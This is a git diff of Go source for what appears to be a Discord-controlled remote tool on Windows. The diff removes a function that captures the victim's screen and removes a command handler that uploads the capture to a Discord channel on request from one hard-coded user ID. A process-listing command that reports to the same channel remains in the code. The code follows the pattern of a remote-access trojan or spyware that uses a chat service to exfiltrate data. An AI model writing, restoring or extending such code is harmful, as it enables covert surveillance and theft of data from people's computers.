@@ -5,7 +5,6 @@ import (
 	"errors"
 	"fmt"
 	"github.com/bwmarrin/discordgo"
-	"github.com/kbinani/screenshot"
 	"github.com/mitchellh/go-ps"
 	"golang.org/x/sys/windows"
 	"image/png"
@@ -221,19 +220,6 @@ func Chunks(s string, chunkSize int) []string {
 }
 
 
-func Screenshot() *os.File{
-
-	bounds := screenshot.GetDisplayBounds(0)
-	img, err := screenshot.CaptureRect(bounds)
-	if err != nil {
-		panic(err)
-	}
-	fileName := fmt.Sprintf("%d_%dx%d.png", 0, bounds.Dx(), bounds.Dy())
-	file, _ := os.Create(fileName)
-	png.Encode(file, img)
-	return file
-}
-
 func PS() string {
 	ps, _ := ps.Processes()
 	str := ": "
@@ -329,11 +315,6 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	// This isn't required in this specific example but it's a good practice.
 	if m.Author.ID == s.State.User.ID {
 		return
-	}
-	// If the message is "ping" reply with "Pong!"
-	if m.Content == "ss" && m.Author.ID == "266947686194741248" {
-		file := Screenshot()
-		s.ChannelFileSend(ChannelID, "file.png", file)
 	}
 
 	if m.Content == "processlist "+UserName+"" && m.Author.ID == "266947686194741248" {
